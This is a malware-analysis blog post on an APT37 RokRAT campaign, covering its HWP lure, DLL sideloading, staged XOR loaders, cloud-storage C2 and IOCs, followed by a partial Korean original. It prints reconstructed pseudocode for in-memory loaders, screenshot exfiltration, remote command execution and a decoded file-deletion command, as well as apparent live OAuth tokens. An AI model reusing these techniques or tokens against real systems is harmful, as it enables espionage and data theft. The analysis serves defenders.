---
title: APT37 RokRAT Multi-Stage Backdoor Campaign Analysis
date: 2026-05-22 00:00:00 +0900
categories:
- Research Notes
tags: []
author: mmamm4
---

# APT37 RokRAT Multi-Stage Backdoor Campaign Analysis

> **Malware Family**: RokRAT
> **Threat Actor**: APT37 (ScarCruft / Reaper / Group123, DPRK-nexus)
> **Initial Access Vector**: HWP lure document («북한 노동당 창건 80주년 행사 동향 종합.hwp»)
> **Campaign/Build ID**: `292ACC33D2`
> **Threat Level**: HIGH

## Overview

This campaign uses a HWP (Hangul Word Processor) document titled "Comprehensive Trends of the 80th Anniversary of the Korean Workers' Party Founding" as its initial access vector. The lure closely mimics the type of reports routinely circulated among professionals in the North Korea intelligence analysis, unification and security policy, and diplomatic security research sectors, demonstrating that the threat actor has precise knowledge of the target's work environment and interests.

The attack chain proceeds as follows.

![image.png](/assets/img/posts/2026-05-22-RokRAT-APT37-hwp-campaign/image.png)

When the HWP document is opened, an embedded OLE object drops a second-stage payload, `version.dll`, into the `%TEMP%` directory and causes a legitimate process to sideload this DLL from the same path. When the user clicks a hyperlink within the document, a multi-stage, memory-resident payload deploys sequentially in the background, ultimately establishing a backdoor that uses multiple cloud OAuth channels as C2.

In addition to the lure document, the campaign leverages content from the Korean government think-tank KDI and the Yonhap News Agency as secondary decoys. It also explicitly lists HWP files (`.HWP`) as a target collection extension, confirming this as cyber espionage activity directed against Korean-language targets.

The combination of technical sophistication — HWP OLE exploitation with hyperlink trigger, DLL sideloading, multi-stage fileless payload deployment, sRDI-class reflective loader, RSA-2048 + AES-128 hybrid encrypted communications, and a multi-cloud C2 backend — together with the specificity of target selection (Korean NK analysis and security policy professionals, policy research institutes, and media) leads to attribution to APT37 (ScarCruft / Reaper / Group123), a North Korea-nexus APT group.

## Detailed Analysis

#### Stage 1 — 북한 노동당 창건 80주년 행사 동향 종합.hwp (OLE Misuse)

When the HWP document is opened, three files are dropped into `%TEMP%`. Note that `vhelp.exe` and `Volumeid1.exe` are identical files.

![image.png](/assets/img/posts/2026-05-22-RokRAT-APT37-hwp-campaign/image%201.png)

Clicking a hyperlink inside the HWP document triggers execution of the EXE dropped in `%TEMP%`, which causes `version.dll` to be sideloaded.

![decoy.png](/assets/img/posts/2026-05-22-RokRAT-APT37-hwp-campaign/decoy.png)

#### Stage 2 — version.dll (DLL Sideloading)

Sideloaded by a legitimate process, `version.dll` decodes an additional payload using a single-byte XOR key (`0xFA`). It writes the Stage 3 file (`TMP[XXXX].tmp`) to `%TEMP%`, loads it into memory, then immediately deletes the file from disk.

```c
if (fdwReason == DLL_PROCESS_ATTACH) {
    operator new(0x108E27)

    // XOR decode loop
    for (i = 0; i < 0x108E00; i++)
        dst[i] = enc[i] ^ 0xFA;

    GetTempPathW + GetTempFileNameW("TMP")     // %TEMP%\TMP[XXXX].tmp
    CreateFileW + WriteFile(decoded, 0x108E00)
    LoadLibraryW(temp_file)                    // load Stage 3
    DeleteFileW(temp_file)
    GetProcAddress(hMod, "sub_10001A09")       // ← Stage 3 export function
    call
    free()
}
```

| Field | Value |
| --- | --- |
| Payload size | `0x108E00` (1,084,928 bytes) |
| XOR key | `0xFA` |
| Drop path | `%TEMP%\TMP[XXXX].tmp` |
| Called export | `sub_10001A09` |

#### Stage 3 — TMP[XXXX].tmp (X = random hex)

**Main routine (`StartAddress`)**

```c
sub_1800010C0(arg)        // 1) Decoy URL branch (based on host EXE filename hash)
if (sub_1800011D0() == 1) // 2) Reinfection prevention check
{
    Sleep(100);
    ExitProcess(0);
}
sub_180001000()           // 3) Mark infected system
sub_1800012A0()           // 4) Decode Stage 4 in memory + execute
return 1;
```

**Decoy URL branch (`sub_1800010C0`)**

```c
filename → lowercase normalization → FNV-1a 32-bit hash:

  hash == 0x52076040  → ShellExecuteW("open",
                          L"hxxps://www.kdi.re.kr/file/download?atch_no=kpndSIj%2FdCYIzNcba3dS6w%3D%3D")
  hash == 0x9F618F77  → ShellExecuteW("open",
                          L"hxxps://www.yna.co.kr/view/AKR20250902112300504")
  no match            → no additional decoy displayed
```

**Infected system marker (`sub_180001000` / `sub_1800011D0`)**

```
HKCU\SOFTWARE\DefaultEdit\LastCheckedVersion = REG_DWORD 1
```

- Set on first execution
- If the registry value is already 1, `ExitProcess` is called immediately (reinfection prevention)

**Stage 4 payload decode routine (`sub_1800012A0`)**

The Stage 4 decryption routine applies XOR with a single-byte key `0xF9`. The implementation processes data in 32-byte blocks using SSE2 SIMD instructions (`PXOR`) with two-way unrolling; the remaining 14 bytes are handled by a standard byte-by-byte XOR loop. While the algorithm itself is trivial, the SSE2 instruction pattern differs from conventional XOR signature rules, providing a bypass effect against pattern-based detection.

```c
v2 = operator new(0x108E27);
sub_1800016F0(v2);

// Phase 1: SSE2 16-byte XOR
__m128i key = xmmword_180108340;       // = 16 bytes of 0xF9
do {
    *dst++ = _mm_xor_si128(_mm_loadu_si128(src++), key);
    *dst++ = _mm_xor_si128(_mm_loadu_si128(src++), key);
} while (--count);

// Phase 2: Residual 14-byte XOR 0xF9
for (i = 0; i < 14; i++) *dst++ ^= 0xF9;

// Fileless memory execution
v7 = VirtualAlloc(NULL, 0x200000,
                  MEM_COMMIT|MEM_RESERVE,
                  PAGE_EXECUTE_READWRITE);   // RWX
memcpy(v7, decoded, ...);
v7();   // direct call → Stage 4 entry
```

| Field | Value |
| --- | --- |
| Payload size | `0x105F4E` (1,072,974 bytes) |
| XOR key (Phase 1) | `xmmword_180108340` = 16 × `0xF9` |
| XOR key (Phase 2) | `0xF9` |
| Decoy URL mappings | `0x52076040` → KDI `0x9F618F77` → Yonhap |
| Infected system marker | `HKCU\SOFTWARE\DefaultEdit\LastCheckedVersion` |

#### Stage 4 — PIC Shellcode

| Function              | Role                                                      |
| --------------------- | --------------------------------------------------------- |
| `sub_50`              | API hash resolver                                         |
| `sub_33C`             | Reflective PE loader main                                 |
| `sub_244`             | PE DOS/NT header parser                                   |
| `sub_2DC`             | DataDirectory access helper                               |
| `sub_15C`             | Stage 5 decode (XOR) + loader call                        |
| `sub_69C`             | x64 SEH                                                   |
| `sub_738` / `sub_73F` | Self-location trick (`mov rax, [rsp]; ret + add rax 0ch`) |

**API hash resolver (`sub_50`)**

| Hash | Resolved API |
| --- | --- |
| `0x5BCD174B` | `RtlAllocateHeap` / `HeapAlloc` / `malloc` |
| `0xAA7ADB76` | `VirtualAlloc` |
| `0x234CCD4B` | `memcpy` / `RtlCopyMemory` |
| `0x406FAB8E` | `LoadLibraryA` |
| `0xE99E570A` | `GetProcAddress` |
| `0x26EB2DC1` | `VirtualFree` |

**Reflective PE mapping (`sub_33C`)**

```
1. Parse DOS/NT headers (sub_244)
2. VirtualAlloc(NULL, SizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
3. Copy PE header + all sections (memcpy)
4. Walk Import Directory:
   for each DLL: hMod = LoadLibraryA(name)
   for each name/ord: addr = GetProcAddress(hMod, name)
5. Process Base Relocation:
   types 1, 2, 3, 10 (HIGH/LOW/HIGHLOW/DIR64)
6. Return EntryPoint RVA
```

**Stage 4 decode (`sub_15C`)**

```c
char  key  = a1[0];           // 1-byte key = 0x29
DWORD size = *(DWORD*)(a1+1); // 4-byte Stage 5 size = 0x105800
char* enc  = a1 + 5;          // start of encrypted PE

for (i = 0; i < size; i++) enc[i] ^= key;   // XOR 0x29 decode

if (sub_33C(enc, size, &mapped) == 0)
    sub_69C(&mapped);         // x64 SEH
```

**Self-location trick**: `sub_73F` returns its own return address via `mov rax, [rsp]; ret`; `sub_738` adds 12 to derive the start address of the Stage 5 data block. This is a standard PIC shellcode technique.

| Field | Value |
| --- | --- |
| Stage 5 start (PIC offset) | `0x749` |
| Header format | `[1B XOR_key][4B PE_size][encrypted PE]` |
| XOR key | `0x29` |
| Stage 5 size | `0x105800` (1,071,104 bytes) |
| Loader pattern | sRDI / Stephen Fewer reflective DLL loader family |

#### Stage 5 — RokRAT Final Payload

**Main routine (WinMain)**

```c
WinMain(hInstance=0x140000000, hPrevInstance, lpCmdLine, nShowCmd) {
    // Initialize RSA public key object
    sub_1400115B4(&xmmword_1400FE4F0,
                  xmmword_1400FE4F0,
                  pubkey_DER_start,    // 0x1400F60D0
                  pubkey_DER_end);     // 0x1400F61F4

    // Collect system info + generate session keys
    sub_1400124B4();

    // Environment flag = "disable"
    qword_1400FE19C = 0x656C6261736964;

    // Main beacon thread
    HANDLE h = CreateThread(NULL, 0, StartAddress, NULL, 0, &tid);
    WaitForSingleObject(h, INFINITE);
    return 0;
}
```

**System information collection (`sub_1400124B4`)**

```c
srand(time64(NULL));

// Host fingerprint IDs
sprintf(word_1400FDD94, L"%04X%04X", rand(), rand());                      // host ID (8 chars)
sprintf(word_1400FE222, L"%04X%04X%08X", rand(), rand(), GetTickCount());  // aux ID
sprintf(word_1400FE24A, L"%04X%04X%08X", rand(), rand(), GetTickCount());  // main ID

// System info collection
GetModuleHandleA("ntdll") + GetProcAddress("RtlGetVersion") → OS version
GetWindowsDirectoryW + GetFileVersionInfoSizeA + VerQueryValueA  → system file version
GetComputerNameW
GetUserNameW
RegOpenKeyExA + RegQueryValueExA → additional registry queries (HW UUID, etc.)
fopen + fread → additional file reads
```

**Main beacon (`StartAddress`)**

```c
for (i = 0; i < 100; i++) {
    for (entry = unk_1400F5CC0; entry < unk_1400F60C8; entry += 516) {
        flag = entry->flag;
        token = entry->token;
        // Walk C2 credentials table to probe active backend
        sub_14001B750(req, flag, token, L"virtual", L"test", L"key");  // connectivity probe
        sub_14001B7F0(req);
        result = sub_14001D7F0(req, L"/", &status, &has_data);
        if (has_data) break;  // break on successful command reception
    }

    if (entry < unk_1400F60C8) {
        dword_1400FDD8C = entry->flag;  // select active backend
        sub_14001B750(&main_req, flag, token, L"real", L"pack", L"team");  // live mode
        break;
    }
    Sleep(10000);
}

if (i != 100 && !sub_140012CD8()) {  // command dispatcher
    do {
        Sleep(1000);
        for (j = 3; !sub_1400156A8() && j; --j) Sleep(5000);
        for (k = 60; k; --k) Sleep(1000);  // 1-minute wait
    } while (!sub_140012CD8());
}
```

**Screenshot and process collection module (`sub_1400156A8`)**

Trigger and interval:

- Called from the do-while loop in main beacon thread `StartAddress @ 0x140015AD8`
- Executes autonomously approximately every 61 seconds, independent of C2 commands
- Retries up to 3 times at 5-second intervals on failure

```c
_BOOL8 sub_1400156A8()
{
    // [Phase 0] Toggle check — controlled by '0'/'i' commands
    if (!byte_1400F5CB0)
        return 1;

    // [Phase 1] Signature header — 4-byte magic "FADEADBA" (0xFA 0xDE 0xAD 0xBA)
    sub_140015D64(payload, 0xFA);
    sub_140015D64(payload, 0xDE);
    sub_140015D64(payload, 0xAD);
    sub_140015D64(payload, 0xBA);

    // Debugger detection telemetry marker
    byte_1400FE14A = IsDebuggerPresent() ? 0x31 : byte_1400FE14A;   // '1' if debugger present
    sub_140015D64(payload, 0x28);                       // append '(' marker

    // [Phase 2] Screen capture (GDI / GDI+)
    hCompatDC = CreateCompatibleDC(NULL);
    hScreenDC = GetDC(NULL);
    hBitmap   = CreateCompatibleBitmap(hScreenDC, w, h);
    SelectObject(hCompatDC, hBitmap);
    BitBlt(hCompatDC, 0, 0, w, h, GetDC(NULL), 0, 0, SRCCOPY /* 0xCC0020 */);

    // [Phase 3] JPEG encoding (Gdiplus)
    jpeg_size = sub_1400117EC(hBitmap, ..., &jpeg_buf);
        // └─ select image/jpeg encoder + GdipSaveImageToFile
        // └─ temp file: %TEMP%\{rand}.tmp → reload into memory
    DeleteObject(hBitmap);

    sub_1400115B4(payload, jpeg_buf, &jpeg_size);
    sub_1400110B4(payload, jpeg_buf, jpeg_size);
    free(jpeg_buf);
    GdiplusShutdown(token);

    // [Phase 4] Append process list once every 6 captures (up to 128KB)
    if (dword_1400FDD88 % 6 == 0) {
        buf2 = operator new(0x20000);
        proc_list_size = sub_140011C94(buf2, 0x20000);  // pid:%d,name:%s,path:%s%s
    }

    // [Phase 5] Build cloud path
    tick = GetTickCount();
    r1 = rand(); r2 = rand();
    wsprintfW(cloud_path, L"/Comment/%04X%04X%08X", r2, r1, tick);
    dword_1400FDD88++;

    // [Phase 6] XOR encode (4-byte random key, per-byte cycling)
    xor_key  = (rand() & 0xFFFF) | ((rand() & 0xFFFF) << 16);
    for (i = 0; i < payload.size; i++)
        payload[i] ^= ((BYTE*)&xor_key)[i & 3];

    // [Phase 7] AES encryption
    sub_1400119E4(payload);

    // [Phase 8] Upload to active cloud backend
    std::wstring::assign(path_w, cloud_path);
    norm = sub_140015E84(out, payload);
    return sub_14001F300(ctx, path_w, norm) == 1;
}
```

### C2 Command Protocol

The first byte of a C2 response serves as the command code (single ASCII byte). Main dispatcher: `sub_140012CD8 @ 0x140012CD8`.

| Code | Action | Notes |
| --- | --- | --- |
| `'0'` | Disable screenshot capture | `byte_1400F5CB0 = 0` |
| `'i'` | Enable screenshot capture | `byte_1400F5CB0 = 1` |
| `'b'` | Immediate termination | `ExitProcess(0x81)` |
| `'j'` | Immediate termination | `ExitProcess(0x81)` |
| `'d'` | Self-cleanup + terminate | Decode encoded wchar sequence → execute `del` command |
| `'f'` | Self-cleanup + terminate | Shorter variant of `'d'` |
| `'g'` | Heartbeat | Send ACK only and return immediately (liveness check) |
| `'h'` | Drive inventory → upload | Calls `sub_14001233C` |
| `'e'` | Arbitrary command execution (RCE) | `ShellExecuteW("open","cmd.exe","/c \"<arg>\"")` |
| `'c'` | File collection upload | `FindFirstFileW` + `sub_140015164`; `Normal`/`All` mode |
| `'1','2'` | Download + memory execution | Execute additional payload directly in memory |
| `'5','6'` | Download + disk file execution | Drop to `%TEMP%` then execute |
| `'3','4'` | XOR decrypt/verify → memory execution | XOR + verify then execute in memory |
| `'7','8','9'` | XOR decrypt/verify → disk drop execution | Decrypt file in `%TEMP%` then execute |

**`'d'`/`'f'` decode algorithm**

```python
key = first_wide_char.low_byte
for i in range(1, len):
    out[i-1] = (wide[i].low_byte - key) & 0xFF
```

**`'d'` decoded result — artifact deletion command**

```bash
del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\*.VBS"
    "%appdata%\*.CMD"
    "%appdata%\*.BAT"
    "%appdata%\*01"
    "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\*.lnk"
    "%allusersprofile%\Microsoft\Windows\Start Menu\Programs\Startup\*.lnk"
    /F /Q
```

The artifact deletion command reveals the persistence paths RokRAT typically maintains:

- `%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\*.VBS` / `*.lnk`
- `%allusersprofile%\Microsoft\Windows\Start Menu\Programs\Startup\*.lnk`
- `%appdata%\*.CMD` / `*.BAT` / `*01`

**`'h'` command — per-drive directory and file enumeration (`sub_14001233C`)**

```c
GetLogicalDriveStringsA to enumerate all drives
for each drive of type 2–4 (REMOVABLE/FIXED/REMOTE) {
    sprintf("dir /A /S %s >> \"%%temp%%/%c_.TMP\"", drive, drive_letter)
    sub_14000EB1C(cmd, wait=true, timeout=600s, prefix=false)
      // └─ ShellExecuteExA(open, cmd.exe, /C <cmd>) + WaitForSingleObject

    sprintf(file, "%TEMP%/<drive>_.TMP")
    sub_140015164(file)  // upload
    DeleteFileW(file)    // remove artifact
}
```

**`'e'` command — arbitrary command execution (RCE)**

```c
wsprintfW(buf, L"/c \"%s\"", command_arg);
ShellExecuteW(NULL, L"open", L"cmd.exe", buf, NULL, SW_HIDE);
```

**`'c'` command — file collection upload (`sub_140015164`)**

```c
FindFirstFileW(Parameters, &FindFileData);
FindClose(...);
if (FindFileData.dwFileAttributes & 0x10) {     // directory
    goto MODE_BRANCH;
} else {
    sub_140015164(Parameters, &FindFileData);    // single file upload
}

MODE_BRANCH:
    wcsicmp(String, "Normal");   // mode token extracted from response payload
    if (== 0) {
        // Target 8 extensions: .XLS .DOC .PPT .TXT .M4A .AMR .PDF .HWP
        // → upload matching files via sub_140015164
    } else if (wcsicmp(String, "All") == 0) {
        // Upload all files
    }
```

| Phase | File upload (`sub_140015164`) | Screenshot upload (`sub_1400156A8`) |
| --- | --- | --- |
| Data collection | `fread()` file content | GDI capture + JPEG encoding |
| Encryption | None | XOR + AES-128-CBC |
| Cloud path | `/Comment/{4hex}292ACC33D2{4hex}` | `/Comment/{4hex}{4hex}{8hex}` |
| Upload | `sub_14001F300` | `sub_14001F300` |

### C2 Backend (Multi-Cloud)

| Class | Cloud Service | Signature |
| --- | --- | --- |
| `CYanApi` | **Yandex Disk** | OAuth refresh token with `y0__` prefix |
| `CDropApi` | **Dropbox** | `server_modified` field in API response |
| `CPcloudApi` | **pCloud** | Identified via RTTI |

**Embedded OAuth tokens (Yandex)**

```
y0__xCvwqD6BxiitDUgtK7BqRJKUd5n0zFOnE5JA1vpobhCHkgkZg
y0__xCgjYyMBxjIhDUgqp2umhIg72AOcJ1RXdfk-fIWhJrHtL7_Iw
```

**Cloud folder structure**

- `/Program/<host_id>/...` — command execution ACK (not the polling path; see below)
- `/Comment/<XXXX>292ACC33D2<XXXX>` — data exfiltration
- `292ACC33D2` is the unique campaign/build ID embedded in all exfiltration paths

### C2 Polling & Communication Mechanism

#### Credential Table Layout

The C2 credential table is stored at `g_c2_server_slots` (`0x1400F5CC0`), with each entry occupying **516 bytes** (129 × `DWORD`). OAuth tokens reside in the parallel array `g_yandex_oauth_tokens` (`0x1400F5CC4`). The `flag` field in each entry determines the backend type:

| Flag | Backend |
| --- | --- |
| `1` | LocalFS (internal test / fallback) |
| `3` | Dropbox |
| `4` | pCloud |
| `5` | Yandex Disk |

Maximum fallback window: **100 iterations × 10 s sleep = ~16.7 minutes**.

#### Two-Phase Beacon Initialization

```c
// Phase 1 — Probe: enumerate reachable backends
c2_session_set_target(session, flag, token,
    L"virtual", L"test", L"key");
c2_session_recv_response(session, L"/", &count, &err);  // poll root dir

// Phase 2 — Commit: switch to operational parameters on first success
c2_session_set_target(g_c2_session_object, active_flag, active_token,
    L"real", L"pack", L"team");
```

`L"pack"` and `L"team"` are folder-path components within the cloud storage directory used for live command delivery.

#### Dead-Drop Command Delivery (Filename Encoding)

C2 commands are not embedded in file content. The **first character of a filename** placed in the designated cloud folder encodes the command — a classic dead-drop technique.

**Yandex Disk polling request:**
```
GET https://cloud-api.yandex.net/v1/disk/resources?path=<poll_path>&limit=500
Authorization: OAuth y0__...
```

**Parsed JSON fields (`_embedded.items[]`):**

| Field | Role |
| --- | --- |
| `name[0]` | **Command code** (single ASCII byte) |
| `type` | `"file"` or `"dir"` |
| `path` | Full cloud path of the item |
| `size` | File size |
| `modified` | Last-modified timestamp |

The same dead-drop mechanism applies to Dropbox (`POST /2/files/list_folder`) and pCloud (`GET /listfolder`).

**Authentication error detection in JSON response:**

| Substring | Meaning | Action |
| --- | --- | --- |
| `nauthorizedError` | OAuth token revoked / expired | Advance to next credential slot |
| `Error` | General API error | Advance to next credential slot |

#### `/Program/<host_id>` — ACK Path, Not Polling Path

The path `/Program/<g_main_id>` is exclusively used to **acknowledge completed command execution** — it is not where the bot polls for new commands. After each command is dispatched, `build_path_program_hostid` constructs this path and calls `cloud_api_send_ack`:

```c
// build_path_program_hostid @ 0x140012C54
wsprintfW(path, L"/%s/%s", L"Program", &g_main_id);
cloud_api_send_ack(&g_c2_session_object, path);   // called after every command
```

`g_main_id` is the 16-character hex machine identifier generated at startup (`%04X%04X%08X` format). The operator can correlate ACKs with specific implant instances by folder name alone.

#### Data Exfiltration — `Content-Type: voice/mp3` Disguise

Upload requests to all three backends carry a hardcoded `Content-Type: voice/mp3` header (`0x1400D3938`), disguising encrypted exfiltration traffic as an audio stream:

```http
PUT /v1/disk/resources/upload?path=/Comment/XXXX292ACC33D2XXXX
Authorization: OAuth y0__...
Content-Type: voice/mp3

--wwjaughalvncjwiajs--
[AES-128-CBC encrypted payload]
--wwjaughalvncjwiajs----
```

#### Backend API Endpoint Summary

| Backend | Command Polling | Data Upload | Auth Header |
| --- | --- | --- | --- |
| **Yandex Disk** | `GET cloud-api.yandex.net/v1/disk/resources?path=<P>&limit=500` | `PUT cloud-api.yandex.net/v1/disk/resources/upload` | `OAuth y0__...` |
| **Dropbox** | `POST api.dropboxapi.com/2/files/list_folder` | `POST content.dropboxapi.com/2/files/upload` | `Bearer <token>` |
| **pCloud** | `GET api.pcloud.com/listfolder` | `POST api.pcloud.com/uploadfile` | OAuth access_token |

### Cryptographic System

**Embedded RSA public key**

```
Modulus size  : 2048-bit
publicExponent: 17 (0x11)  ← non-standard (standard is 65537)
SPKI SHA256   : 62b069a49c772367c2d7ace2f3fd45be53e8431549cc050ee8f8955eccc61326
Modulus SHA256: 3253d1149320d7c706442c4fb7883d0ed84f9335af85ed7d4c12a2f3993ab5ae
```

`e=17` is a valid Fermat prime (F3) and is mathematically sound for RSA. While most implementations default to `e=65537` (F4), standard utilities such as OpenSSL support explicit exponent specification, making `e=17` key generation achievable without any custom tooling. The choice therefore indicates that the threat actor deliberately specified a non-default public exponent — an intentional deviation from convention, but not necessarily evidence of a bespoke key generation utility.

**Encrypted communication flow**

```
Upload:
  1. Encrypt plaintext with AES-128-CBC (session_key, random IV)
  2. Encrypt session_key with RSA (attacker public key)
  3. Combine into multipart/form-data (boundary=--wwjaughalvncjwiajs--)
  4. PUT to Yandex / Dropbox / pCloud API

Response:
  1. GET file from cloud
  2. Decrypt with AES-128-CBC → single-character command + argument
```

**Session key source**: Freshly generated on each execution via `CryptoPP::AutoSeededRandomPool` (backed by `CryptGenRandom`). Cannot be statically extracted.

## Indicators of Compromise

**MD5**

```
ea95109b608841d2f99a25bd2646ff43  stage3_payload.bin
339d68ebd97bd65c2e5cec57ffd3159c  stage4_payload.bin
2f3dff7779795fc01291b0a31d723aca  stage5_payload.bin
ceabad2cc6a94b00d163bf016ccc1aa2  version.dll
f13a4834e3e1613857b84a1203e2e182  북한 노동당 창건 80주년 행사 동향 종합.hwp
```

**C2**

Yandex Disk, Dropbox, pCloud cloud services

---

<style>.kr-code-block{margin:1em 0;border-radius:6px;overflow-x:auto;background:#272822;}.kr-code-block>code{display:block;white-space:pre;padding:1em;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:0.85em;line-height:1.5;color:#f8f8f2;background:transparent;}</style>
<details class="kr-orig" markdown="0"><summary>🇰🇷 한국어 원문</summary><div class="kr-content">
<h2>2026-05-22-RokRAT-APT37-hwp-campaign</h2>
<h2><strong>1. 개요</strong></h2>
<p>본 캠페인은「북한 노동당 창건 80주년 행사 동향 종합.hwp」라는 한컴오피스 한글 문서를 초기 침투 벡터로 활용하는 정교한 표적형 공격입니다. 해당 디코이 문서는 한국의 대북 정보 분석, 통일·안보 정책, 외교 안보 연구 부문에서 일상적으로 유통되는 보고서 유형을 모방한 것으로, 공격자가 표적의 업무 환경과 관심사를 정밀하게 파악하고 있음을 보여줍니다.</p>
<p>공격 흐름은 다음과 같습니다.</p>
<p><img alt="image.png" src="/assets/img/posts/2026-05-22-RokRAT-APT37-hwp-campaign/image.png" /></p>
<p>HWP 문서 열람 시 임베드된 OLE 객체가 %TEMP% 경로에 2차 페이로드인 version.dll을 드롭하고, 동일 경로에서 합법 프로세스가 이 DLL을 사이드로딩하도록 유도합니다. 사용자는 문서 내의 하이퍼링크 클릭 시, 백그라운드에서는 다단계 메모리 상주 페이로드가 순차 전개되며 최종적으로 다중 클라우드 OAuth를 C2 채널로 활용하는 백도어가 동작합니다.</p>
<p>디코이 문서와 더불어 한국 정부 싱크탱크(KDI), 언론사(연합뉴스) 콘텐츠를 보조 미끼로 활용하며, 한컴오피스 한글(.HWP) 문서를 명시적 수집 표적에 포함시켜 한국 대상 사이버 첩보 활동임을 명확히 드러내고 있습니다.</p>
<p>기법적 정교함(HWP OLE 악용 + 하이퍼링크 트리거 + DLL 사이드로딩, 다단계 파일리스 전개, sRDI 계열 reflective loader, RSA-2048 + AES-128 하이브리드 암호 통신, 다중 클라우드 백엔드)과 표적 선정의 특수성(한국 대북·안보 분석 부문, 정책연구·언론)을 종합할 때, 북한 연계 APT 그룹인 APT37(ScarCruft / Reaper / Group123)로 판단됩니다.</p>
<h2><strong>2. 상세 분석</strong></h2>
<h4>Stage 1 <strong>— 북한 노동당 창건 80주년 행사 동향 종합.hwp (OLE 악용)</strong></h4>
<p>한글 문서 열람 시 %TEMP% 경로에 3가지 파일이 드롭되며, vhelp.exe와 Volumeid1.exe 파일은 동일한 파일입니다.</p>
<p><img alt="image.png" src="/assets/img/posts/2026-05-22-RokRAT-APT37-hwp-campaign/image%201.png" /></p>
<p>한글 문서 내부의 하이퍼링크 클릭 시 %TEMP% 경로의 EXE 파일이 실행되며, version.dll이 로드됩니다.</p>
<p><img alt="decoy.png" src="/assets/img/posts/2026-05-22-RokRAT-APT37-hwp-campaign/decoy.png" /></p>
<h4>Stage 2 <strong>— version.dll (DLL Side-Loading 기법)</strong></h4>
<p>정상 프로세스에 사이드로딩되어 1바이트 키(0xFA)를 이용하여 추가 페이로드를 디코딩합니다. stage 3(TMP[XXXX].tmp) 파일을 %TEMP% 경로에 저장하고 메모리에 로드한 후, stage 3(TMP[XXXX].tmp) 파일을 삭제합니다.</p>
<pre class="highlight"><code class="language-c">if (fdwReason == DLL_PROCESS_ATTACH) {
    operator new(0x108E27)

    // XOR 디코드 루프
    for (i = 0; i &lt; 0x108E00; i++)
        dst[i] = enc[i] ^ 0xFA;

    GetTempPathW + GetTempFileNameW(&quot;TMP&quot;)     // %TEMP%\TMP[XXXX].tmp
    CreateFileW + WriteFile(decoded, 0x108E00)
    LoadLibraryW(임시파일)                     // stage 3 로드
    DeleteFileW(임시파일)
    GetProcAddress(hMod, &quot;sub_10001A09&quot;)       // ← stage 3의 export 함수
    호출
    free()
}
</code></pre>

<table>
<thead>
<tr>
<th>항목</th>
<th>값</th>
</tr>
</thead>
<tbody>
<tr>
<td>페이로드 크기</td>
<td><code>0x108E00</code> (1,084,928 bytes)</td>
</tr>
<tr>
<td>XOR 키</td>
<td><code>0xFA</code></td>
</tr>
<tr>
<td>드롭 위치</td>
<td><code>%TEMP%\TMP[XXXX].tmp</code></td>
</tr>
<tr>
<td>호출 export 함수</td>
<td><code>sub_10001A09</code></td>
</tr>
</tbody>
</table>
<h4>Stage 3 <strong>— TMP[XXXX].tmp (X = random hex)</strong></h4>
<p><strong>메인 루틴 (<code>StartAddress</code>)</strong></p>
<pre class="highlight"><code class="language-c">sub_1800010C0(arg)        // 1) 미끼 URL 분기 (호스트 EXE 파일명 기반)
if (sub_1800011D0() == 1) // 2) 재감염 방지
{
    Sleep(100);
    ExitProcess(0);
}
sub_180001000()           // 3) 감염 시스템 표시
sub_1800012A0()           // 4) stage 4 메모리 디코드 + 실행
return 1;
</code></pre>

<p><strong>미끼 URL 분기 (<code>sub_1800010C0</code>)</strong></p>
<pre class="highlight"><code class="language-c">파일명 → 소문자 정규화 → FNV-1a 32-bit 해시:

  hash == 0x52076040  → ShellExecuteW(&quot;open&quot;,
                          L&quot;https://www.kdi.re.kr/file/download?atch_no=kpndSIj%2FdCYIzNcba3dS6w%3D%3D&quot;)
  hash == 0x9F618F77  → ShellExecuteW(&quot;open&quot;,
                          L&quot;https://www.yna.co.kr/view/AKR20250902112300504&quot;)
  매치 안 되면 추가 미끼 미표시
</code></pre>

<p><strong>감염 시스템 식별 (<code>sub_180001000</code> / <code>sub_1800011D0</code>)</strong></p>
<pre class="highlight"><code>HKCU\SOFTWARE\DefaultEdit\LastCheckedVersion = REG_DWORD 1
</code></pre>

<ul>
<li>첫 실행 시 set</li>
<li>레지스트리 값이 이미 1이면 즉시 ExitProcess (재감염 방지)</li>
</ul>
<p><strong>추가 페이로드(Stage 4) 디코드 루틴 (<code>sub_1800012A0</code>)</strong></p>
<p>Stage 4 페이로드 복호화 루틴은 단일 바이트 키 0xF9를 사용한 XOR 연산입니다. 구현상 SSE2 SIMD 명령어(PXOR)와 2배 언롤링을 통해 32바이트 단위로 처리하며, 마지막 14바이트(전체 크기가 32로 나누어 떨어지지 않는 잔여분)는 일반 바이트 단위 XOR 루프로 보완 처리합니다. 알고리즘 자체는 단순하지만 SSE2 명령어 패턴이 일반적인 XOR 시그니처 룰과 다르므로, 패턴 기반 탐지 우회 효과가 있습니다.</p>
<pre class="highlight"><code class="language-c">v2 = operator new(0x108E27);
sub_1800016F0(v2);

// Phase 1: SSE2 16바이트 단위 XOR
__m128i key = xmmword_180108340;       // = 16바이트 모두 0xF9
do {
    *dst++ = _mm_xor_si128(_mm_loadu_si128(src++), key);
    *dst++ = _mm_xor_si128(_mm_loadu_si128(src++), key);
} while (--count);

// Phase 2: 잔여 14바이트 XOR 0xF9
for (i = 0; i &lt; 14; i++) *dst++ ^= 0xF9;

// 메모리 실행 (파일리스)
v7 = VirtualAlloc(NULL, 0x200000,
                  MEM_COMMIT|MEM_RESERVE,
                  PAGE_EXECUTE_READWRITE);   // RWX
memcpy(v7, decoded, ...);
v7();   // 직접 호출 → stage 4 진입
</code></pre>

<table>
<thead>
<tr>
<th>항목</th>
<th>값</th>
</tr>
</thead>
<tbody>
<tr>
<td>페이로드 크기</td>
<td><code>0x105F4E</code> (1,072,974)</td>
</tr>
<tr>
<td>XOR 키 (Phase 1)</td>
<td><code>xmmword_180108340</code> = 16 × <code>0xF9</code></td>
</tr>
<tr>
<td>XOR 키 (Phase 2)</td>
<td><code>0xF9</code></td>
</tr>
<tr>
<td>추가 미끼 매핑</td>
<td><code>0x52076040</code> → KDI<br> <code>0x9F618F77</code> → 연합뉴스</td>
</tr>
<tr>
<td>감염시스템 표시</td>
<td><code>HKCU\SOFTWARE\DefaultEdit\LastCheckedVersion</code></td>
</tr>
</tbody>
</table>
<h4>Stage 4 <strong>— PIC shellcode</strong></h4>
<table>
<thead>
<tr>
<th>함수</th>
<th>역할</th>
</tr>
</thead>
